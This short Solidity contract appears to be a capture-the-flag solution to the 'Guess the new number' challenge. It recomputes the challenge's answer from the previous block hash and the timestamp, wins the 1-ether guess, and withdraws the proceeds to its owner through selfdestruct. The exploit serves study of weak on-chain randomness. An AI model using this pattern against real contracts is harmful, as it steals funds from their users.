pragma solidity ^0.4.21;

import "../GuessTheNewNumberChallenge.sol";

contract GuessTheNewNumberHelper {
    address owner;

    function GuessTheNewNumberHelper() public {
        owner = msg.sender;
    }

    function exploit(address _lottery) external payable {
        GuessTheNewNumberChallenge(_lottery).guess.value(1 ether)(
            uint8(keccak256(block.blockhash(block.number - 1), now))
        );
    }

    function withdrawAllFunds() external {
        require(msg.sender == owner);
        selfdestruct(owner);
    }

    function() external payable {}
}
